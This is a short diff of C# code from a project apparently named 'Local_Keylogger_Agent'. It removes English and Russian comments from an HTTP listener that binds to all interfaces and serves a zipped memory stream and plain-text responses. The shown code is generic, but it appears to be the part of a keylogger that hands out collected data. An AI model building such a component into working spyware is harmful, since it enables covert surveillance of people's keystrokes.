@@ -12,7 +12,7 @@ namespace Local_Keylogger_Agent
         public void StartHTTPServer()
         {
             httpListener = new HttpListener();
-            httpListener.Prefixes.Add($"http://+:{HTTPort}/"); // Set the prefix for the HTTP server
+            httpListener.Prefixes.Add($"http://+:{HTTPort}/");
             httpListener.Start();
 
             Task.Run(async () =>
@@ -85,11 +85,11 @@ namespace Local_Keylogger_Agent
             memoryStream.Position = 0; // Reset the stream position
 
             //send the zip file as response
-            response.ContentType = "application/zip"; // MIME type for zip files
-            response.ContentLength64 = memoryStream.Length; // Set the content length
-            response.StatusCode = (int)HttpStatusCode.OK; // 200 OK
-            await memoryStream.CopyToAsync(response.OutputStream); // Write the zip file to the response stream
-            response.OutputStream.Close(); // Close the output stream
+            response.ContentType = "application/zip";
+            response.ContentLength64 = memoryStream.Length;
+            response.StatusCode = (int)HttpStatusCode.OK;
+            await memoryStream.CopyToAsync(response.OutputStream);
+            response.OutputStream.Close();
         }
 
 
@@ -97,10 +97,10 @@ namespace Local_Keylogger_Agent
         public static void WriteResponse(HttpListenerResponse response, string text)
         {
             byte[] buffer = Encoding.UTF8.GetBytes(text);
-            response.ContentType = "text/plain; charset=utf-8";  // MIME‑тип
-            response.ContentLength64 = buffer.Length;              // длина тела
-            response.StatusCode = (int)HttpStatusCode.OK;       // код 200
-            response.OutputStream.Write(buffer, 0, buffer.Length); // запись в поток
+            response.ContentType = "text/plain; charset=utf-8";
+            response.ContentLength64 = buffer.Length;
+            response.StatusCode = (int)HttpStatusCode.OK;
+            response.OutputStream.Write(buffer, 0, buffer.Length);
         }
     }
 }
